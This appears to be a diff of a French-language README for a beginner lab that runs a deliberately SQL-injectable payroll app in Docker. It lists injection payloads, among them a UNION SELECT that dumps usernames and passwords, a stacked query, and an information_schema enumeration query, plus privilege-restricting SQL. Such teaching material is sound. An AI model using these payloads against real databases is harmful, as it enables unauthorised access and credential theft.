@@ -1,20 +1,44 @@
-# startrek_payroll
+# Docker Vulnerable App SQL Injection
 
-A simple SQL injection vulnerable web application powered by Docker
+*Niveau: Débutant*
 
-## Project Summary
+![](readme_docs/a22c71cd.png)
 
-This is a simple web application that is vulnerable to SQL injection attacks. The web application is based on the `payroll_app` from the [Metasploitable3 project](https://github.com/rapid7/metasploitable3), and the PHP code is taken (almost) directly from that project. The primary contribution of this project is a Docker environment using docker-compose and consisting of Nginx, PHP and MySQL containers to run the web application easily.
+---
 
-## Lancement
+# Objectif
 
+Tester la vulnérabilité d'une application en injectant du SQL.
 
+---
+
+# Notions à étudier
+
+- Injection SQL
+
+---
+
+# Configuration
+
+Les Fenelon sont stockés dans le fichier **int.sql** ligne **53**
+
+Il est nécessaire d'aller modifier les 3words avant de démarrer le container.
+
+---
+
+# Lancement du container
+
+```bash
 docker-compose up --env-file .env -d
+```
 
-Open web browser and visit:
+Accès à l'application vulnérable:
 
-- `http://localhost:8080`
+![](readme_docs/cf88d548.png)
 
+http://localhost:8080
+
+---
 
 ## Example Payloads
 
@@ -50,11 +74,17 @@ Open web browser and visit:
    - `username`: `' UNION ALL SELECT NULL,concat(0x28,username,0x3a,first_name,0x3a,last_name,0x3a,password,0x29) FROM users #`
    - `password`: `anythingyouwant`
 
+---
 
+# Propositions des étudiants:
 
-Propositions étudiants:
+1. Le nom de l'utilisateur et le nom de la table **doivent** être connus
 
+> On ne voit pas le code du fenelon!
+
+```sql
 fenelon'; SELECT * FROM users; --
+```
 
 SELECT table_name FROM information_schema.tables WHERE table_schema = 'capturethefenelon
 
@@ -64,13 +94,26 @@ Fournir le TP sqlmap
 
 https://www.advania.co.uk/insights/blog/mysql-sql-injection-practical-cheat-sheet/?lai_vid=yAN64pOwgSeOd&lai_sr=45-49&lai_sl=m
 
+---
 
-Mettre à jour la base
+# Mettre à jour la base
+
+Dans le container **03-docker-vulnerable-app-sqlinjection-mysql**, en tant que **root**:
+
+```sql
 update users set first_name='chien', last_name='racheter', password='supérieur' where username='fenelon';
-
 select * from users where username = 'fenelon';
+```
+---
 
+# Mise à jour
 
-Mise à jour 
 Faire un utilisateur dont les droits sont limités à du simple insert ou select, pas de update
-> Empêcher les update 
+
+```sql
+-- Revoke Privileges on update to simple user: fenelon
+REVOKE ALL ON capturethefenelon FROM 'fenelon'@'%';
+
+-- Grant only SELECT privileges to user fenelon
+GRANT SELECT ON capturethefenelon TO 'fenelon'@'%';
+```
